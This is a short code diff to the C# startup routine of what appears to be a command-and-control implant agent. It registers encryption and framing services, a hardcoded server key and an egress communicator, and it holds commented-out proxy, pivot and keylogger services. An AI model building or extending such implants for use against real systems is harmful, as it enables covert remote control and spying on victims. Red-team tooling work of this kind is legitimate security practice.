@@ -22,6 +22,11 @@ namespace EntryPoint
 
         public static void Main(string[] args)
         {
+
+#if DEBUG
+            System.IO.File.AppendAllText(@"c:\users\olivier\log.txt", "tarting!");
+#endif
+
 #if DEBUG
             _args = args;
 #endif
@@ -56,7 +61,7 @@ namespace EntryPoint
             }
             else
             {
-                serverKey = "1yOdEVXef7ljnzrRgINB27Bi4zGwi1v2B664b65hAO7elTTM";
+                serverKey = "1yOdEVXef7ljnzrRgINB27Bi4zGwi1v2";
             }
 
             //connUrl = "https://192.168.48.128:443";
@@ -78,17 +83,21 @@ namespace EntryPoint
 
             var configService = new ConfigService();
             configService.ServerKey = serverKey;
+            configService.EncryptFrames = true;
 
             ServiceProvider.RegisterSingleton<IConfigService>(configService);
             ServiceProvider.RegisterSingleton<INetworkService>(new NetworkService());
             ServiceProvider.RegisterSingleton<IFileService>(new FileService());
             ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
+            var cryptoService = new CryptoService(configService);
+            ServiceProvider.RegisterSingleton<ICryptoService>(cryptoService);
+            ServiceProvider.RegisterSingleton<IFrameService>(new FrameService(cryptoService, configService));
 
             //ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
             //ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
             //ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
 
-            
+
             var commModule = CommunicationFactory.CreateEgressCommunicator(connexion);
             var agent = new Agent.Agent(metaData, commModule);
 
